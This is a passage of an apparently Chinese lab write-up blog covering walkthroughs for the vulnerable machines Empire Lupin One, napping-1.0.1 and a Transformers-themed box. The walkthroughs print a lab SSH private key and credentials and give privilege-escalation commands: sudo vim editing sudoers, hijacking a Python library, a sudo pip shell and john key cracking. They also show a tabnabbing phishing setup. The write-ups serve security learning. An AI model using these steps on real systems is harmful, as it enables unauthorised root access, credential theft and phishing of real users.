class="hljs-string">&#x27;PHPSESSID=m20ttg2fihm10hbonpgv1v41rt&#x27;</span><br>    &#125;<br>    <br>    res = requests.post(<span class="hljs-attribute">url</span>=url, <span class="hljs-attribute">data</span>=data, <span class="hljs-attribute">headers</span>=header)<br>    <span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>![image-20230925090251749](C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230925090251749.png)</code></pre></li><li><pre><code class="hljs">Purchase Successful!Megatron Login Panel URL: /M3G4TR0N_SUPR3M3/login.php Username = L0RD_M3G4Tr0N Password = freakishlylongpasswordforl0gin<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><br>    登陆成功，拿到第二个flag![image<span class="hljs-number">-20230925090611785</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20230925090611785.</span>png)<br><br><span class="hljs-number">15.</span> 检查发现版本为php8<span class="hljs-number">.1</span>dev，searchsploit一下，好啊，我最喜欢RCE了😋![image<span class="hljs-number">-20230925091056326</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20230925091056326.</span>png)![image<span class="hljs-number">-20230925091539296</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20230925091539296.</span>png)<br><br><span class="hljs-number">16.</span> tnnd，这个脚本的命令行真傻呗，经过我不懈的摸索(看攻略)，终于学会了ssh提权并成功在`/home/soundwave/.ssh/pem/`下找到了私钥并成功登入![image<span class="hljs-number">-20230925094844657</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20230925094844657.</span>png)<br><br><span class="hljs-number">17.</span> 下一步，提权，这里我试试新工具，看起来非常的全面啊，我们整理下可能有用的信息<br><br></code></pre></td></tr></table></figure>/home/megatr0n/.sudo_as_admin_successfulpasswd file: /etc/pam.d/passwdpasswd file: /etc/passwdpasswd file: /usr/share/bash-completion/completions/passwdpasswd file: /usr/share/lintian/overrides/passwdUser soundwave may run the following commands on warship:    (root) NOPASSWD: /usr/bin/vim /var/Decepticon/*<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>    ![image-20230925103945221](C:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20230925103945221.png)<br><br>18. 我们先看了./sudo_as_admin_success 空，接着联系可执行命令和<span class="hljs-built_in">history</span>，得知作者修改了我们的sudo权限，用的方法就是sudo vim，所以我们用 `sudo /usr/bin/vim`来修改文件，同时利用我们可修改的目录`/var/Deception/*` 来实现目录穿越，最终命令<br><br></code></pre></td></tr></table></figure>sudo /usr/bin/vim /var/Deception/../../etc/sudoers<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-code">    将里面soundwave用户的可执行命令改为 NOPASSWD:ALL ,即可无密码执行root权限，拿到最后一个flag。</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">19.</span> 这里我傻呗了，改成了(ALL:ALL) ALL, 直接给作者的洞修了，纯NT行为。<br><br><br><br><br><br><span class="hljs-section">### 01 - Empire Lupin One</span><br><br><br><br><span class="hljs-bullet">1.</span> 扫ip，端口发现 22 80<br><br><span class="hljs-bullet">2.</span> 扫目录，找到个robots.txt，里面有个提示/~myfile  ，直接访问此目录无可用信息<br><br><span class="hljs-bullet">3.</span> 利用fuzz工具扫描指定格式的文件<br><br></code></pre></td></tr></table></figure></code></pre></li></ol><p>   fuff -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;big.txt -u <a href="http://192.168.48.131/~FUZZ">http://192.168.48.131/~FUZZ</a><br>   <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><br><span class="hljs-number">4.</span> 发现存在~secret目录，再次扫描![image<span class="hljs-number">-20231007102724324</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007102724324.</span>png)<br><br>   ![](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007102804791.</span>png)<br><br><span class="hljs-number">5.</span> ![image<span class="hljs-number">-20231007105502775</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007105502775.</span>png)<br><br>   看起来要用ssh私钥登录，我们接着扫<br><br></code></pre></td></tr></table></figure><br>   ffuf -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u <a href="http://192.168.48.131/~secret/.FUZZ.txt">http://192.168.48.131/~secret/.FUZZ.txt</a><br>   <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><br>   ![image<span class="hljs-number">-20231007105725740</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007105725740.</span>png)<br><br><span class="hljs-number">6.</span> 发现了`.mysecret.txt`文件，访问看一下<br><br></code></pre></td></tr></table></figure><br>   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<br>   <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br><span class="hljs-bullet">7.</span> base58解密后得到密钥<br><br></code></pre></td></tr></table></figure><br>   —–BEGIN OPENSSH PRIVATE KEY—–<br>   b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>   PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br>   9GXiytplgT9z&#x2F;mP91NqOU9QoAwop5JNxhEfm&#x2F;j5KQmdj&#x2F;JB7sQ1hBotONvqaAdmsK+OYL9<br>   H6NSb0jMbMc4soFrBinoLEkx894B&#x2F;PqUTODesMEV&#x2F;aK22UKegdwlJ9Arf+1Y48V86gkzS6<br>   xzoKn&#x2F;ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>   J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0&#x2F;nRfCaOrIzPfZ&#x2F;NNYgu<br>   &#x2F;Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>   ZnaDsmjoYv2uLVLi19jrfnp&#x2F;tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>   he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>   XdcBVXZkouX3nlZB1&#x2F;Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>   hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr&#x2F;66Ma4e6iwPLqmtzt3UiFGb<br>   4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>   mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>   MkMcBnzD9uynCjhZ9ijaPY&#x2F;vMY7mtHZNCY8SeoWAxYXToKy2cu&#x2F;+pVyGQ76KYt3J0AT7wA<br>   2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG&#x2F;b7z6zGvVxZca&#x2F;g572CXxXSXlb<br>   QOw&#x2F;AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>   vFUPiANSHCZ&#x2F;b+pdKQtBzTk5&#x2F;VH&#x2F;Jk3QPcH69EJyx8&#x2F;gRE&#x2F;glQY6z6nC6uoG4AkIl+gOxZ<br>   0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2&#x2F;uWDWZcW4tDskEVPft<br>   rqE36ftm9eJ&#x2F;nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>   QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>   x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn&#x2F;tLuNPLNjG<br>   nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>   VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>   cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>   nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV&#x2F;hZBWPD8Zefm<br>   8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4&#x2F;xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>   zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>   n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>   AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>   oVb4p&#x2F;rHHqqPNMNwM1ns+adF7REjzFwr4&#x2F;trZq0XFkrpCe5fBYH58YyfO&#x2F;g8up3DMxcSSI<br>   63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>   y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>   t&#x2F;YYhQ&#x2F;r2z30YfqwLas7ltoJotTcmPqII28JpX&#x2F;nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>   Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>   yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br>   8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>   mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r<br>   VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x&#x2F;IUt&#x2F;FP8Nq964pD7m&#x2F;dPHQ<br>   E8&#x2F;oh4V1NTGWrDsK3AbLk&#x2F;MrgROSg7Ic4BS&#x2F;8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>   BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O&#x2F;+Kk9NUWalsz+6Kt2<br>   yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>   wDSuOKenqc71GfvgmVOUypYTtoI527fiF&#x2F;9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br>   5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>   vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT&#x2F;DKcZ<br>   Qb50sQsJUxKkuMyfvDQC9wyhYnH0&#x2F;4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br>   1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>   ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel&#x2F;4ORlsC<br>   iUJ66WmRUN9EoVlkeCzQJwivI&#x3D;<br>   —–END OPENSSH PRIVATE KEY—–<br>   <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br><span class="hljs-number">8</span>. 现在我们拿到了私钥，还知道用户名icex64，尝试直接ssh私钥登录失败，搜索得知，可以利用`john`工具从私钥中爆破出用户密码<br><br></code></pre></td></tr></table></figure><br>   python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; aaaa<br>   john aaaa<br>   <figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><br>   ![image<span class="hljs-number">-20231007113740113</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007113740113.</span>png)给我kali的CPU拉满了hhh<br><br>   ![image<span class="hljs-number">-20231007140821096</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007140821096.</span>png)<br><br><span class="hljs-number">9.</span> 现在ssh登录靶机，这里不知道什么原因一直错误，于是拯救模式登进靶机把密码重置了![image<span class="hljs-number">-20231007141912495</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007141912495.</span>png)<br><br><span class="hljs-number">10.</span> 接下来尝试提权![image<span class="hljs-number">-20231007142111784</span>](<span class="hljs-name">C</span>:\Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image<span class="hljs-number">-20231007142111784.</span>png)<br><br><span class="hljs-number">11.</span> 这就很简单了，修改/home/arsene/beist.py 文件，写入提权代码，python运行即可<br><br>    ```python<br>    <span class="hljs-keyword">import</span> pty<br>    pty.spawn(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br></code></pre></td></tr></table></figure></p><ol start="12"><li><p>查看权限发现该脚本文件只能看不能修改，但是脚本文件执行了webbrowser库的open函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> webbrowser<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Its not yet ready to get in action&quot;</span>)<br>webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;https://empirecybersecurity.co.mz&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>查看webbrowser库，发现任意用户可写入，于是修改open函数，添加<code>os.system(&#39;/bin/bash&#39;)</code>, 运行heist.py文件，得到arsene用户的shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo -u arsene <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3.9 /</span>home<span class="hljs-regexp">/arsene/</span>heist.py<br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231007144216893.png" alt="image-20231007144216893"></p></li><li><p>下一步sudo pip提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span> -d)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py<br>sudo pip install <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure></li><li><p>交互式shell</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="napping-1-0-1"><a href="#napping-1-0-1" class="headerlink" title="napping-1.0.1"></a>napping-1.0.1</h3><ol><li><p>扫ip，端口发现22 8080</p></li><li><p>8080上运行一个登陆页面和一个输入框，管理员会点击我们输入的网址<img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121235017.png" alt="image-20231008121235017"></p></li><li><p>搜索得知此处可以利用 <code>标签钓鱼</code> 即 <code>TabNapping</code> ，我们利用kali上的一款社工工具 <code>setoolkit</code>，创建一个标签钓鱼网站</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">此处调试软件废了不少功夫，大概的报错有两个：urllib has <span class="hljs-keyword">no</span> attribution named <span class="hljs-string">&#x27;urlopen&#x27;</span>; result <span class="hljs-number">404</span><br>搜索得到的解决方法为将 /usr/share/<span class="hljs-keyword">set</span>/src/webattack/tabnabbing/tabnabbing.py 中的<span class="hljs-comment">urllib.urlopen</span> 改为 <span class="hljs-comment">urllib.request.urlopen</span>， 并注释后续的五行代码<br>原理：python2中的 urllib 库存在<span class="hljs-comment">urlopen</span>方法，但是<span class="hljs-comment">python3</span>中将这个方法放在了<span class="hljs-comment">urllib.reequest</span>下；<span class="hljs-comment">404</span>的原因是目标网站可能并不存在图标，这里可以选择直接删除图标，也可以先判断是否存在再决定要不要添加图标<br></code></pre></td></tr></table></figure><p><img src="/.io//Users\yanyiyin\AppData\Roaming\Typora\typora-user-images\image-20231008121558813.png" alt="image-20231008121558813"></p></li><li><p>再自己写一个跳转网页，用python开一个http服务，把这个网页的url写进输入框，让管理员点击就会跳转到我们上面的钓鱼网站</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">boby</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">opener</span>.<span class="hljs-property">parent</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">replace</span>(<span 